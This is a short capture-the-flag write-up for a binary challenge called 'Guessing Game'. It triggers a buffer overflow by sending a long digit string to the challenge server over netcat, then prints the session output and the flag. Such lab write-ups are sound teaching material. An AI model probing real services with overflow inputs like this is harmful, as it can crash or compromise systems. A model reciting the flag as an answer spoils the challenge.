## Guessing Game


### Problem
```
No one seems to be able to guess my favorite animal... Can you?

Flag format: PCTF{}

Author: @angr404

nc chal.pctf.competitivecyber.club 9999
```
Files provided:
- guessinggame
### Solution

One of the most basic techniques for binary exploitation is the buffer overflow. While there are several different ways to implement this technique, they all tend to start by figuring out how large of a buffer you are working with. 

I do this by copy-pasting the string **"12234567890"** over and over until the program stops functioning correctly.

Once I used a long enough string, the program gave me the flag

```
$  nc chal.pctf.competitivecyber.club 9999
Hello there, friend! Can you guess my favorite animal?
Input guess: 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890
ERRR! Wrong!
I wasn't able to trick you...
PCTF{1_l0v3_g1raff35_85036769}
```

Flag = `PCTF{1_l0v3_g1raff35_85036769}`
